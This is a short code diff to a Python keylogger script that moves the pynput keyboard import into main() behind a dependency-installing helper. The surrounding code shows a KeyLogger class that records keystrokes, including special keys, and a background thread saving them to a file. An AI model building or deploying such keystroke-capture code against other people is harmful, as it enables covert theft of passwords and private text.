@@ -4,7 +4,10 @@ import threading
 import time
 from datetime import datetime
 import json
-from pynput.keyboard import Listener, Key
+import support
+
+Key = None
+Listener = None
 
 class KeyLogger:
     def __init__(self):
@@ -82,10 +85,15 @@ class KeyLogger:
                     self.current_text += special_keys[key]
 
     def on_release(self, key):
+        global Key
         if key == Key.esc:
             return False
 
 def main():
+    support.ensure_dependencies(["pynput"])
+    global Listener, Key
+    from pynput.keyboard import Listener, Key
+
     logger = KeyLogger()
     saver = threading.Thread(target=logger.save_to_file, daemon=True)
     saver.start()
